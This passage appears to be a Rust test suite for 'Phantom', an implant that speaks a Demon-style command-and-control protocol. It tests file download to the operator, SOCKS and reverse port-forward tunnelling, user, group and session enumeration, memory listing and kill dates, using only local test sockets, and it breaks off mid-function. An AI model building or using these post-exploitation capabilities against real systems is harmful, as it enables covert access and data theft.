        payload.extend_from_slice(&utf16_payload("CORP.LOCAL"));
        let package = DemonPackage::new(DemonCommand::CommandNet, 10, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(*request_id, 10);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Computer));
        assert_eq!(read_utf16(payload, &mut offset), "CORP.LOCAL");
    }

    #[tokio::test]
    async fn proc_memory_returns_structured_payload_instead_of_stub_error() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonProcessCommand::Memory as i32).to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandProc, 11, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(*request_id, 11);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonProcessCommand::Memory));
        assert_eq!(read_u32(payload, &mut offset), 0);
        assert_eq!(read_u32(payload, &mut offset), 0);
        assert!(offset < payload.len(), "expected at least one memory region");
        let _base = read_u64(payload, &mut offset);
        let _size = read_u32(payload, &mut offset);
        let _protect = read_u32(payload, &mut offset);
        let _state = read_u32(payload, &mut offset);
        let _type = read_u32(payload, &mut offset);
    }

    #[tokio::test]
    async fn memfile_then_upload_emits_expected_callbacks() {
        let content = b"phantom-upload";

        let mut memfile = Vec::new();
        memfile.extend_from_slice(&77_i32.to_le_bytes());
        memfile.extend_from_slice(&(content.len() as i64).to_le_bytes());
        memfile.extend_from_slice(&(content.len() as i32).to_le_bytes());
        memfile.extend_from_slice(content);

        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("upload.bin");

        let mut upload = Vec::new();
        upload.extend_from_slice(&(DemonFilesystemCommand::Upload as i32).to_le_bytes());
        upload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        upload.extend_from_slice(&77_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandMemFile, 3, memfile), &mut state)
            .await
            .expect("memfile");
        execute(&DemonPackage::new(DemonCommand::CommandFs, 4, upload), &mut state)
            .await
            .expect("upload");

        let callbacks = state.drain_callbacks();
        assert!(matches!(
            callbacks.as_slice(),
            [
                PendingCallback::MemFileAck { request_id: 3, mem_file_id: 77, success: true },
                PendingCallback::FsUpload { request_id: 4, file_size, .. }
            ] if *file_size == content.len() as u32
        ));
        assert_eq!(std::fs::read(path).expect("read back"), content);
    }

    #[tokio::test]
    async fn reverse_port_forward_add_queues_socket_callback() {
        let listener = std::net::TcpListener::bind(("127.0.0.1", 0)).expect("reserve port");
        let port = listener.local_addr().expect("addr").port();
        drop(listener);

        let mut payload = Vec::new();
        payload
            .extend_from_slice(&(DemonSocketCommand::ReversePortForwardAdd as i32).to_le_bytes());
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&(i32::from(port)).to_le_bytes());
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&8080_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandSocket, 5, payload), &mut state)
            .await
            .expect("socket");

        assert!(matches!(
            state.drain_callbacks().as_slice(),
            [PendingCallback::Socket { request_id: 5, .. }]
        ));
    }

    #[tokio::test]
    async fn reverse_port_forward_add_local_relays_data() {
        let target = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await.expect("bind target");
        let target_port = target.local_addr().expect("target addr").port();
        let target_task = tokio::spawn(async move {
            let (mut stream, _) = target.accept().await.expect("accept target");
            let mut buffer = [0_u8; 32];
            let read = stream.read(&mut buffer).await.expect("read target");
            stream.write_all(&buffer[..read]).await.expect("write target");
        });

        // Pass port 0 so the OS assigns an available port atomically, eliminating the
        // TOCTOU race that caused this test to fail non-deterministically under parallel
        // execution (reserve-port-then-drop would let another test grab the port).
        let mut payload = Vec::new();
        payload.extend_from_slice(
            &(DemonSocketCommand::ReversePortForwardAddLocal as i32).to_le_bytes(),
        );
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&(i32::from(target_port)).to_le_bytes());

        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandSocket, 6, payload), &mut state)
            .await
            .expect("socket");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { request_id: 6, payload }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(
            read_u32(payload, &mut offset),
            u32::from(DemonSocketCommand::ReversePortForwardAddLocal)
        );
        assert_eq!(read_u32(payload, &mut offset), 1);
        // Skip socket_id and bind_addr fields to reach the bound port assigned by the OS.
        let _socket_id = read_u32(payload, &mut offset);
        let _bind_addr = read_u32(payload, &mut offset);
        let bind_port = read_u32(payload, &mut offset) as u16;

        let mut client = tokio::net::TcpStream::connect(("127.0.0.1", bind_port))
            .await
            .expect("connect listener");
        poll_until(&mut state, |state| !state.local_relays.is_empty()).await;

        client.write_all(b"phantom-rportfwd").await.expect("write client");
        poll_n(&mut state, 10).await;
        let mut echoed = vec![0_u8; "phantom-rportfwd".len()];
        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut echoed))
            .await
            .expect("read timeout")
            .expect("read echoed");
        assert_eq!(echoed, b"phantom-rportfwd");

        drop(client);
        poll_until(&mut state, |state| state.local_relays.is_empty()).await;
        target_task.await.expect("target task");
    }

    #[tokio::test]
    async fn socks_proxy_commands_manage_listener_lifecycle() {
        let mut add_payload = Vec::new();
        add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
        add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        add_payload.extend_from_slice(&0_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandSocket, 7, add_payload), &mut state)
            .await
            .expect("socks add");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { request_id: 7, payload }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyAdd));
        assert_eq!(read_u32(payload, &mut offset), 1);
        let socket_id = read_u32(payload, &mut offset);
        assert_ne!(socket_id, 0);
        assert_eq!(read_u32(payload, &mut offset), u32::from(Ipv4Addr::LOCALHOST));
        let bound_port = read_u32(payload, &mut offset);
        assert_ne!(bound_port, 0);
        assert_eq!(state.socks_proxies.len(), 1);

        let list_payload = (DemonSocketCommand::SocksProxyList as i32).to_le_bytes().to_vec();
        execute(&DemonPackage::new(DemonCommand::CommandSocket, 8, list_payload), &mut state)
            .await
            .expect("socks list");
        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { request_id: 8, payload }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyList));
        assert_eq!(read_u32(payload, &mut offset), socket_id);
        assert_eq!(read_u32(payload, &mut offset), u32::from(Ipv4Addr::LOCALHOST));
        assert_eq!(read_u32(payload, &mut offset), bound_port);

        let mut remove_payload = Vec::new();
        remove_payload
            .extend_from_slice(&(DemonSocketCommand::SocksProxyRemove as i32).to_le_bytes());
        remove_payload.extend_from_slice(&socket_id.to_le_bytes());
        execute(&DemonPackage::new(DemonCommand::CommandSocket, 9, remove_payload), &mut state)
            .await
            .expect("socks remove");
        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { request_id: 9, payload }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyRemove));
        assert_eq!(read_u32(payload, &mut offset), socket_id);
        assert!(state.socks_proxies.is_empty());

        let mut add_payload = Vec::new();
        add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
        add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        add_payload.extend_from_slice(&0_i32.to_le_bytes());
        execute(&DemonPackage::new(DemonCommand::CommandSocket, 10, add_payload), &mut state)
            .await
            .expect("socks add");
        let _ = state.drain_callbacks();

        let clear_payload = (DemonSocketCommand::SocksProxyClear as i32).to_le_bytes().to_vec();
        execute(&DemonPackage::new(DemonCommand::CommandSocket, 11, clear_payload), &mut state)
            .await
            .expect("socks clear");
        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { request_id: 11, payload }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyClear));
        assert_eq!(read_u32(payload, &mut offset), 1);
        assert!(state.socks_proxies.is_empty());
    }

    #[tokio::test]
    async fn socks_proxy_relays_connect_and_data() {
        let target = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await.expect("bind target");
        let target_port = target.local_addr().expect("target addr").port();
        let target_task = tokio::spawn(async move {
            let (mut stream, _) = target.accept().await.expect("accept target");
            let mut buffer = [0_u8; 32];
            let read = stream.read(&mut buffer).await.expect("read target");
            stream.write_all(&buffer[..read]).await.expect("write target");
        });

        let mut add_payload = Vec::new();
        add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
        add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        add_payload.extend_from_slice(&0_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandSocket, 12, add_payload), &mut state)
            .await
            .expect("socks add");
        let callbacks = state.drain_callbacks();
        let [PendingCallback::Socket { payload, .. }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyAdd));
        assert_eq!(read_u32(payload, &mut offset), 1);
        let _socket_id = read_u32(payload, &mut offset);
        let _bind_addr = read_u32(payload, &mut offset);
        let proxy_port = read_u32(payload, &mut offset) as u16;

        let mut client =
            tokio::net::TcpStream::connect(("127.0.0.1", proxy_port)).await.expect("connect proxy");
        client.write_all(&[5, 1, 0]).await.expect("write greeting");
        poll_until(&mut state, |state| !state.socks_clients.is_empty()).await;
        let mut greeting = [0_u8; 2];
        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut greeting))
            .await
            .expect("greeting timeout")
            .expect("read greeting");
        assert_eq!(greeting, [5, 0]);

        client
            .write_all(&[5, 1, 0, 1, 127, 0, 0, 1, (target_port >> 8) as u8, target_port as u8])
            .await
            .expect("write connect");
        poll_until(&mut state, |state| {
            state
                .socks_clients
                .values()
                .any(|client| matches!(client.state, super::SocksClientState::Relay { .. }))
        })
        .await;

        let mut reply = [0_u8; 10];
        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut reply))
            .await
            .expect("reply timeout")
            .expect("read reply");
        assert_eq!(reply[0..2], [5, 0]);

        client.write_all(b"phantom-socks").await.expect("write payload");
        poll_n(&mut state, 10).await;
        let mut echoed = vec![0_u8; "phantom-socks".len()];
        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut echoed))
            .await
            .expect("echo timeout")
            .expect("read echo");
        assert_eq!(echoed, b"phantom-socks");

        drop(client);
        poll_until(&mut state, |state| state.socks_clients.is_empty()).await;
        target_task.await.expect("target task");
    }

    #[test]
    fn parse_logged_on_users_deduplicates_and_sorts() {
        let users = parse_logged_on_users(
            "alice pts/0 2026-03-23 10:00 (10.0.0.1)\n\
             bob pts/1 2026-03-23 10:05 (10.0.0.2)\n\
             alice pts/2 2026-03-23 10:10 (10.0.0.3)\n",
        );
        assert_eq!(users, vec!["alice".to_owned(), "bob".to_owned()]);
    }

    #[test]
    fn parse_logged_on_sessions_prefers_remote_host_when_present() {
        let sessions = parse_logged_on_sessions(
            "alice pts/0 2026-03-23 10:00 (10.0.0.1)\n\
             bob pts/1 2026-03-23 10:05\n",
        );
        assert_eq!(
            sessions,
            vec![
                SessionEntry {
                    client: "10.0.0.1".to_owned(),
                    user: "alice".to_owned(),
                    active: 0,
                    idle: 0,
                },
                SessionEntry {
                    client: "pts/1".to_owned(),
                    user: "bob".to_owned(),
                    active: 0,
                    idle: 0,
                },
            ]
        );
    }

    #[test]
    fn parse_user_entries_marks_uid_zero_as_admin() {
        let users = parse_user_entries(
            "root:x:0:0:root:/root:/bin/bash\n\
             daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
        );
        assert_eq!(
            users,
            vec![
                UserEntry { name: "daemon".to_owned(), is_admin: false },
                UserEntry { name: "root".to_owned(), is_admin: true },
            ]
        );
    }

    #[test]
    fn parse_group_entries_formats_gid_and_members() {
        let groups = parse_group_entries(
            "root:x:0:\n\
             wheel:x:10:alice,bob\n",
        );
        assert_eq!(
            groups,
            vec![
                GroupEntry { name: "root".to_owned(), description: "gid=0".to_owned() },
                GroupEntry {
                    name: "wheel".to_owned(),
                    description: "gid=10; members=alice,bob".to_owned(),
                },
            ]
        );
    }

    #[test]
    fn parse_memory_region_maps_linux_permissions_to_windows_compatible_constants() {
        let image = parse_memory_region("00400000-00452000 r-xp 00000000 08:01 12345 /usr/bin/cat")
            .expect("image region");
        assert_eq!(image.base, 0x0040_0000);
        assert_eq!(image.size, 0x52_000);
        assert_eq!(image.protect, PAGE_EXECUTE_READ);
        assert_eq!(image.state, MEM_COMMIT);
        assert_eq!(image.mem_type, MEM_IMAGE);

        let mapped =
            parse_memory_region("7f0000000000-7f0000001000 rw-s 00000000 00:05 99 /dev/shm/demo")
                .expect("mapped region");
        assert_eq!(mapped.protect, super::PAGE_WRITECOPY);
        assert_eq!(mapped.mem_type, MEM_MAPPED);

        let private =
            parse_memory_region("7ffd5f1c4000-7ffd5f1e5000 rw-p 00000000 00:00 0 [stack]")
                .expect("private region");
        assert_eq!(private.protect, PAGE_READWRITE);
        assert_eq!(private.mem_type, MEM_PRIVATE);

        let writable_exec = parse_memory_region("7f0000002000-7f0000003000 rwxp 00000000 00:00 0")
            .expect("writable exec region");
        assert_eq!(writable_exec.protect, PAGE_EXECUTE_READWRITE);
    }

    // ── CommandTransfer / chunked download tests ───────────────────────────

    #[tokio::test]
    async fn fs_download_queues_file_open_and_registers_download() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("download.bin");
        std::fs::write(&path, b"hello download").expect("write test file");

        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let package = DemonPackage::new(DemonCommand::CommandFs, 42, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::FileOpen { request_id, file_id, file_size, file_path } = &callbacks[0]
        else {
            panic!("expected FileOpen, got: {callbacks:?}");
        };
        assert_eq!(*request_id, 42);
        assert_eq!(*file_size, 14);
        assert!(!file_path.is_empty());
        assert!(*file_id != 0 || *file_id == 0); // random, just ensure it exists

        assert_eq!(state.downloads.len(), 1);
        assert_eq!(state.downloads[0].total_size, 14);
        assert_eq!(state.downloads[0].state, DownloadTransferState::Running);
    }

    #[tokio::test]
    async fn push_download_chunks_sends_data_and_close() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("chunked.bin");
        let data = vec![0xAB_u8; 100];
        std::fs::write(&path, &data).expect("write test file");

        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let package = DemonPackage::new(DemonCommand::CommandFs, 50, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");
        state.drain_callbacks(); // drain the FileOpen

        // Poll to push chunks.
        state.push_download_chunks();
        let callbacks = state.drain_callbacks();

        // With 100 bytes and a 512 KiB chunk size, should get one chunk + close.
        assert_eq!(callbacks.len(), 2);

        let PendingCallback::FileChunk { data: chunk, .. } = &callbacks[0] else {
            panic!("expected FileChunk, got: {:?}", callbacks[0]);
        };
        assert_eq!(chunk.len(), 100);
        assert!(chunk.iter().all(|b| *b == 0xAB));

        assert!(matches!(&callbacks[1], PendingCallback::FileClose { .. }));
        assert!(state.downloads.is_empty());
    }

    #[tokio::test]
    async fn file_open_callback_encodes_beacon_output_command_id() {
        let callback = PendingCallback::FileOpen {
            request_id: 1,
            file_id: 0x1234,
            file_size: 4096,
            file_path: "/tmp/test.bin".to_owned(),
        };
        assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));

        let payload = callback.payload().expect("payload");
        let mut offset = 0;
        assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::File));
        let inner_len = read_u32(&payload, &mut offset) as usize;
        assert_eq!(inner_len, 4 + 4 + "/tmp/test.bin".len());
        assert_eq!(read_u32(&payload, &mut offset), 0x1234);
        assert_eq!(read_u32(&payload, &mut offset), 4096);
        let path_bytes = &payload[offset..];
        assert_eq!(path_bytes, b"/tmp/test.bin");
    }

    #[tokio::test]
    async fn file_chunk_callback_encodes_correctly() {
        let callback =
            PendingCallback::FileChunk { request_id: 2, file_id: 0xDEAD, data: vec![1, 2, 3, 4] };
        assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));

        let payload = callback.payload().expect("payload");
        let mut offset = 0;
        assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::FileWrite));
        let inner_len = read_u32(&payload, &mut offset) as usize;
        assert_eq!(inner_len, 4 + 4); // file_id + data
        assert_eq!(read_u32(&payload, &mut offset), 0xDEAD);
        assert_eq!(&payload[offset..], &[1, 2, 3, 4]);
    }

    #[tokio::test]
    async fn file_close_callback_encodes_correctly() {
        let callback = PendingCallback::FileClose { request_id: 3, file_id: 0xBEEF };
        assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));

        let payload = callback.payload().expect("payload");
        let mut offset = 0;
        assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::FileClose));
        assert_eq!(read_u32(&payload, &mut offset), 4); // inner len
        assert_eq!(read_u32(&payload, &mut offset), 0xBEEF);
    }

    #[tokio::test]
    async fn transfer_list_returns_active_downloads() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("list.bin");
        std::fs::write(&path, b"list test data").expect("write");

        let mut fs_payload = Vec::new();
        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
            .await
            .expect("download");
        state.drain_callbacks();

        let file_id = state.downloads[0].file_id;

        // Send CommandTransfer List
        let mut transfer_payload = Vec::new();
        transfer_payload.extend_from_slice(&(DemonTransferCommand::List as i32).to_le_bytes());
        execute(
            &DemonPackage::new(DemonCommand::CommandTransfer, 10, transfer_payload),
            &mut state,
        )
        .await
        .expect("transfer list");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandTransfer));
        assert_eq!(*request_id, 10);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::List));
        // One download entry: file_id + read_size + state
        assert_eq!(read_u32(payload, &mut offset), file_id);
        assert_eq!(read_u32(payload, &mut offset), 0); // read_size = 0 (not started)
        assert_eq!(read_u32(payload, &mut offset), DownloadTransferState::Running as u32);
    }

    #[tokio::test]
    async fn transfer_stop_pauses_download() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("stop.bin");
        std::fs::write(&path, vec![0u8; 1024 * 1024]).expect("write");

        let mut fs_payload = Vec::new();
        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
            .await
            .expect("download");
        state.drain_callbacks();

        let file_id = state.downloads[0].file_id;

        // Stop the download.
        let mut stop_payload = Vec::new();
        stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
        stop_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload), &mut state)
            .await
            .expect("transfer stop");

        assert_eq!(state.downloads[0].state, DownloadTransferState::Stopped);

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { payload, .. }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::Stop));
        assert_eq!(read_u32(payload, &mut offset), 1); // found = true
        assert_eq!(read_u32(payload, &mut offset), file_id);

        // Pushing chunks should NOT produce any data for a stopped download.
        state.push_download_chunks();
        let callbacks = state.drain_callbacks();
        assert!(callbacks.is_empty(), "stopped download should not produce chunks");
    }

    #[tokio::test]
    async fn transfer_resume_restarts_download() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("resume.bin");
        std::fs::write(&path, b"resume data").expect("write");

        let mut fs_payload = Vec::new();
        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
            .await
            .expect("download");
        state.drain_callbacks();

        let file_id = state.downloads[0].file_id;

        // Stop then resume.
        let mut stop_payload = Vec::new();
        stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
        stop_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload), &mut state)
            .await
            .expect("stop");
        state.drain_callbacks();

        let mut resume_payload = Vec::new();
        resume_payload.extend_from_slice(&(DemonTransferCommand::Resume as i32).to_le_bytes());
        resume_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 21, resume_payload), &mut state)
            .await
            .expect("resume");

        assert_eq!(state.downloads[0].state, DownloadTransferState::Running);
        state.drain_callbacks();

        // After resume, pushing chunks should produce data again.
        state.push_download_chunks();
        let callbacks = state.drain_callbacks();
        assert!(
            callbacks.iter().any(|c| matches!(c, PendingCallback::FileChunk { .. })),
            "resumed download should produce chunks"
        );
    }

    #[tokio::test]
    async fn transfer_remove_marks_download_for_removal() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("remove.bin");
        std::fs::write(&path, vec![0u8; 1024 * 1024]).expect("write");

        let mut fs_payload = Vec::new();
        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
            .await
            .expect("download");
        state.drain_callbacks();

        let file_id = state.downloads[0].file_id;

        // Remove the download.
        let mut remove_payload = Vec::new();
        remove_payload.extend_from_slice(&(DemonTransferCommand::Remove as i32).to_le_bytes());
        remove_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 30, remove_payload), &mut state)
            .await
            .expect("transfer remove");

        // Should produce two callbacks: the action response and the close notification.
        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 2);

        // Push should clean it up.
        state.push_download_chunks();
        let close_callbacks = state.drain_callbacks();
        assert!(
            close_callbacks.iter().any(|c| matches!(c, PendingCallback::FileClose { .. })),
            "removed download should emit FileClose on next push"
        );
        assert!(state.downloads.is_empty());
    }

    #[tokio::test]
    async fn transfer_stop_nonexistent_returns_not_found() {
        let mut state = PhantomState::default();
        let mut stop_payload = Vec::new();
        stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
        stop_payload.extend_from_slice(&(0xDEAD_BEEF_u32 as i32).to_le_bytes());
        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 40, stop_payload), &mut state)
            .await
            .expect("transfer stop nonexistent");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { payload, .. }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::Stop));
        assert_eq!(read_u32(payload, &mut offset), 0); // found = false
    }

    #[tokio::test]
    async fn cat_still_returns_full_file_as_structured_callback() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("cat.txt");
        std::fs::write(&path, b"cat content").expect("write");

        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonFilesystemCommand::Cat as i32).to_le_bytes());
        payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let package = DemonPackage::new(DemonCommand::CommandFs, 55, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, .. }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandFs));
        // Cat should not create tracked downloads.
        assert!(state.downloads.is_empty());
    }

    #[tokio::test]
    async fn execute_kill_date_stores_timestamp() {
        let timestamp: i64 = 1_800_000_000;
        let payload = timestamp.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandKillDate, 50, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute kill date");
        assert_eq!(state.kill_date(), Some(timestamp));

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Output { request_id, text } = &callbacks[0] else {
            panic!("expected Output callback, got: {callbacks:?}");
        };
        assert_eq!(*request_id, 50);
        assert!(text.contains("1800000000"));
    }

    #[tokio::test]
    async fn execute_kill_date_zero_disables() {
        let payload = 0_i64.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandKillDate, 51, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute kill date zero");
        assert_eq!(state.kill_date(), None);

        let callbacks = state.drain_callbacks();
        let PendingCallback::Output { text, .. } = &callbacks[0] else {
            panic!("expected Output callback");
        };
        assert!(text.contains("disabled"));
    }

    #[tokio::test]
    async fn execute_kill_date_updates_existing() {
        let mut state = PhantomState::default();

        // Set initial kill date.
        let payload = 1_800_000_000_i64.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandKillDate, 60, payload);
        execute(&package, &mut state).await.expect("set initial");
        state.drain_callbacks();

        // Update to a new kill date.
        let payload = 1_900_000_000_i64.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandKillDate, 61, payload);
        execute(&package, &mut state).await.expect("update");
        assert_eq!(state.kill_date(), Some(1_900_000_000));
    }

    #[test]
    fn kill_date_callback_has_correct_command_id() {
        let callback = PendingCallback::KillDate { request_id: 0 };
        assert_eq!(callback.command_id(), u32::from(DemonCommand::CommandKillDate));
        assert_eq!(callback.request_id(), 0);
        assert!(callback.payload().expect("payload").is_empty());
    }

    #[test]
    fn queue_kill_date_callback_adds_to_pending() {
        let mut state = PhantomState::default();
        state.queue_kill_date_callback();
        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        assert!(matches!(callbacks[0], PendingCallback::KillDate { request_id: 0 }));
    }

    // ---- CommandConfig tests ----

    fn config_payload(key: u32, extra: &[u8]) -> Vec<u8> {
        let mut payload = (key as i32).to_le_bytes().to_vec();
        payload.extend_from_slice(extra);
        payload
    }

    #[tokio::test]
    async fn config_kill_date_sets_state_and_echoes_back() {
        let kill_date: i64 = 1_700_000_000;
        let payload = config_payload(154, &kill_date.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandConfig, 10, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        assert_eq!(state.kill_date(), Some(1_700_000_000));

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
